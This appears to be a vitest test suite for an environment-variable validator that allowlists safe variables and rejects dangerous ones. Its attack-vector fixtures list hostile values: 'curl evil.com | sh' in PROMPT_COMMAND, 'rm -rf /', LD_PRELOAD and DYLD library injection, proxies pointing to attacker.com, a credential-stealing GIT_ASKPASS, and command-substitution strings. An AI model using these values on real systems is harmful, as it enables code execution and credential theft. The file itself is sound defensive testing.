import { describe, expect, it } from "vitest";
import { validateEnvVar, validateHostEnv } from "./env-validation.js";

describe("Environment Variable Validation", () => {
  describe("validateEnvVar", () => {
    describe("allowlist enforcement", () => {
      it("allows whitelisted variables with valid values", () => {
        const result = validateEnvVar("USER", "testuser");
        expect(result.allowed).toBe(true);
        expect(result.value).toBe("testuser");
      });

      it("rejects non-whitelisted variables", () => {
        const result = validateEnvVar("LD_PRELOAD", "/tmp/evil.so");
        expect(result.allowed).toBe(false);
        expect(result.reason).toBe("NOT_IN_WHITELIST");
      });

      it("rejects dangerous variables even with innocuous values", () => {
        const dangerous = [
          "NODE_OPTIONS",
          "PYTHONPATH",
          "JAVA_TOOL_OPTIONS",
          "BASH_ENV",
          "LD_LIBRARY_PATH",
          "GIT_SSH_COMMAND",
          "AWS_SECRET_ACCESS_KEY",
          "HTTP_PROXY",
          "TMPDIR",
          "MALLOC_CHECK_",
          "RUBYOPT",
          "PERL5OPT",
          "PROMPT_COMMAND",
          "ENV",
          "CDPATH",
          "SSL_CERT_FILE",
        ];

        for (const name of dangerous) {
          expect(validateEnvVar(name, "innocent_value").allowed).toBe(false);
        }
      });
    });

    describe("value validation", () => {
      it("rejects null bytes", () => {
        const result = validateEnvVar("USER", "test\0user");
        expect(result.allowed).toBe(false);
        expect(result.reason).toBe("NULL_BYTES");
      });

      it("rejects newlines", () => {
        const result = validateEnvVar("USER", "test\nuser");
        expect(result.allowed).toBe(false);
        expect(result.reason).toBe("INVALID_CHARACTERS");
      });

      it("rejects command substitution", () => {
        expect(validateEnvVar("TERM", "xterm$(whoami)").allowed).toBe(false);
        expect(validateEnvVar("TERM", "xterm`id`").allowed).toBe(false);
      });

      it("rejects values exceeding max length", () => {
        const result = validateEnvVar("USER", "a".repeat(10000));
        expect(result.allowed).toBe(false);
        expect(result.reason).toBe("VALUE_TOO_LONG");
      });

      it("rejects shell metacharacters", () => {
        const malicious = [
          "value$(whoami)",
          "value`id`",
          "value; rm -rf /",
          "value && curl evil.com",
          "value || wget evil.com",
          "value > /tmp/output",
          "value < /etc/passwd",
        ];
        for (const value of malicious) {
          expect(validateEnvVar("USER", value).allowed).toBe(false);
        }
      });
    });

    describe("per-variable validators", () => {
      it("USER: accepts valid, rejects invalid", () => {
        expect(validateEnvVar("USER", "john").allowed).toBe(true);
        expect(validateEnvVar("USER", "john_doe").allowed).toBe(true);
        expect(validateEnvVar("USER", "_system").allowed).toBe(true);
        expect(validateEnvVar("USER", "").allowed).toBe(false);
        expect(validateEnvVar("USER", "123start").allowed).toBe(false);
        expect(validateEnvVar("USER", "user name").allowed).toBe(false);
        expect(validateEnvVar("USER", "a".repeat(65)).allowed).toBe(false);
      });

      it("HOME: restricts to safe prefixes", () => {
        expect(validateEnvVar("HOME", "/home/user").allowed).toBe(true);
        expect(validateEnvVar("HOME", "/Users/user").allowed).toBe(true);
        expect(validateEnvVar("HOME", "/root").allowed).toBe(true);
        expect(validateEnvVar("HOME", "/tmp").allowed).toBe(false);
        expect(validateEnvVar("HOME", "/etc/passwd").allowed).toBe(false);
        expect(validateEnvVar("HOME", "/home/../etc").allowed).toBe(false);
        expect(validateEnvVar("HOME", "home/user").allowed).toBe(false);
      });

      it("SHELL: only allows known shells", () => {
        expect(validateEnvVar("SHELL", "/bin/bash").allowed).toBe(true);
        expect(validateEnvVar("SHELL", "/usr/bin/zsh").allowed).toBe(true);
        expect(validateEnvVar("SHELL", "/usr/local/bin/fish").allowed).toBe(true);
        expect(validateEnvVar("SHELL", "/tmp/evil").allowed).toBe(false);
        expect(validateEnvVar("SHELL", "bash").allowed).toBe(false);
      });

      it("TERM: validates terminal identifier format", () => {
        expect(validateEnvVar("TERM", "xterm").allowed).toBe(true);
        expect(validateEnvVar("TERM", "xterm-256color").allowed).toBe(true);
        expect(validateEnvVar("TERM", "").allowed).toBe(false);
        expect(validateEnvVar("TERM", "xterm;id").allowed).toBe(false);
      });

      it("LANG/LC_*: validates locale format", () => {
        expect(validateEnvVar("LANG", "en_US.UTF-8").allowed).toBe(true);
        expect(validateEnvVar("LC_ALL", "C").allowed).toBe(true);
        expect(validateEnvVar("LC_CTYPE", "POSIX").allowed).toBe(true);
        expect(validateEnvVar("LANG", "C.UTF-8").allowed).toBe(true);
        expect(validateEnvVar("LANG", "invalid_locale").allowed).toBe(false);
      });

      it("TZ: validates timezone format", () => {
        expect(validateEnvVar("TZ", "UTC").allowed).toBe(true);
        expect(validateEnvVar("TZ", "America/New_York").allowed).toBe(true);
        expect(validateEnvVar("TZ", "+0500").allowed).toBe(true);
        expect(validateEnvVar("TZ", "../../etc/passwd").allowed).toBe(false);
      });

      it("numeric vars: validates integer format", () => {
        expect(validateEnvVar("SHLVL", "1").allowed).toBe(true);
        expect(validateEnvVar("COLUMNS", "80").allowed).toBe(true);
        expect(validateEnvVar("SHLVL", "not_a_number").allowed).toBe(false);
        expect(validateEnvVar("COLUMNS", "80.5").allowed).toBe(false);
      });
    });
  });

  describe("validateHostEnv", () => {
    it("filters to only allowlisted variables with valid values", () => {
      const input = {
        USER: "testuser",
        HOME: "/home/testuser",
        TERM: "xterm",
        LD_PRELOAD: "/tmp/evil.so",
        NODE_OPTIONS: "--inspect",
        PYTHONPATH: "/tmp/evil",
        SAFE_BUT_NOT_LISTED: "value",
        SHELL: "/bin/bash",
      };

      const result = validateHostEnv(input);

      expect(result).toEqual({
        USER: "testuser",
        HOME: "/home/testuser",
        TERM: "xterm",
        SHELL: "/bin/bash",
      });
    });

    it("skips undefined values", () => {
      const input = {
        USER: "testuser",
        UNDEFINED_VAR: undefined,
        TERM: "xterm",
      };

      const result = validateHostEnv(input as Record<string, string>);
      expect(result).toEqual({ USER: "testuser", TERM: "xterm" });
    });

    it("filters out variables with invalid values", () => {
      const input = {
        USER: "valid_user",
        HOME: "/tmp/invalid_home",
        TERM: "xterm$(whoami)",
        SHELL: "/bin/bash",
      };

      const result = validateHostEnv(input);
      expect(result).toEqual({ USER: "valid_user", SHELL: "/bin/bash" });
    });
  });

  describe("attack vector regression", () => {
    const attackVectors = [
      // Dynamic linker
      { name: "LD_PRELOAD", value: "/tmp/evil.so" },
      { name: "LD_LIBRARY_PATH", value: "/tmp" },
      { name: "LD_AUDIT", value: "/tmp/audit.so" },
      { name: "DYLD_INSERT_LIBRARIES", value: "/tmp/evil.dylib" },
      { name: "DYLD_LIBRARY_PATH", value: "/tmp" },
      // Language runtimes
      { name: "NODE_OPTIONS", value: "--require=/tmp/evil.js" },
      { name: "NODE_PATH", value: "/tmp" },
      { name: "PYTHONPATH", value: "/tmp" },
      { name: "PYTHONHOME", value: "/tmp" },
      { name: "RUBYLIB", value: "/tmp" },
      { name: "RUBYOPT", value: "-r/tmp/evil" },
      { name: "PERL5LIB", value: "/tmp" },
      { name: "PERL5OPT", value: "-M/tmp/evil" },
      { name: "JAVA_TOOL_OPTIONS", value: "-javaagent:/tmp/evil.jar" },
      { name: "GOPATH", value: "/tmp" },
      { name: "CARGO_HOME", value: "/tmp" },
      // Shell
      { name: "BASH_ENV", value: "/tmp/evil.sh" },
      { name: "ENV", value: "/tmp/evil.sh" },
      { name: "PROMPT_COMMAND", value: "curl evil.com | sh" },
      { name: "IFS", value: "$()" },
      // Git
      { name: "GIT_SSH_COMMAND", value: "evil.sh" },
      { name: "GIT_PROXY_COMMAND", value: "/tmp/evil" },
      { name: "GIT_ASKPASS", value: "/tmp/steal-creds" },
      // Proxy/TLS
      { name: "HTTP_PROXY", value: "http://attacker.com" },
      { name: "HTTPS_PROXY", value: "http://attacker.com" },
      { name: "SSL_CERT_FILE", value: "/tmp/evil-ca.pem" },
      { name: "NODE_EXTRA_CA_CERTS", value: "/tmp/evil-ca.pem" },
      // PATH
      { name: "PATH", value: "/tmp:$PATH" },
      // Credentials
      { name: "AWS_SECRET_ACCESS_KEY", value: "secret" },
      { name: "GOOGLE_APPLICATION_CREDENTIALS", value: "/tmp/creds.json" },
      // System
      { name: "TMPDIR", value: "/attacker/controlled" },
      { name: "MALLOC_CHECK_", value: "2" },
      { name: "CC", value: "/tmp/evil-compiler" },
      { name: "EDITOR", value: "/tmp/evil-editor" },
      { name: "DOCKER_HOST", value: "tcp://attacker.com:2376" },
      { name: "XDG_CONFIG_HOME", value: "/tmp/config" },
      { name: "NVM_DIR", value: "/tmp/nvm" },
    ];

    it.each(attackVectors)("blocks $name", ({ name, value }) => {
      const result = validateEnvVar(name, value);
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe("NOT_IN_WHITELIST");
    });

    const valueInjections = [
      { name: "USER", value: "user$(whoami)", desc: "command substitution" },
      { name: "USER", value: "user`id`", desc: "backtick substitution" },
      { name: "USER", value: "user\nmalicious", desc: "newline injection" },
      { name: "USER", value: "user\0null", desc: "null byte injection" },
      { name: "HOME", value: "/home/user/../../../etc", desc: "path traversal" },
      { name: "SHELL", value: "/tmp/evil-shell", desc: "arbitrary shell path" },
      { name: "DISPLAY", value: ":0$(whoami)", desc: "command injection in display" },
    ];

    it.each(valueInjections)("blocks value injection: $desc on $name", ({ name, value }) => {
      expect(validateEnvVar(name, value).allowed).toBe(false);
    });
  });
});
